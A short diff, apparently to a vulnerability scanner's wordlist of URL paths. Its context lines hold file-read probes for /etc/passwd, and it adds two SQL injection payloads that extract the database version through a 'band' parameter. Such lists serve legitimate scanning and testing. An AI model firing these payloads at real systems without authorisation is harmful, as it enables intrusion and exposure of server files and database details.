@@ -256,3 +256,5 @@
 /plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
 /index.php?mod=textviewer&src=file:///etc/passwd
 /helpdesk/WebObjects/Helpdesk.woa
+/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
+/api/raster/search/?band=1)%20AND%201=CAST((SELECT%20version())%20AS%20INT)--
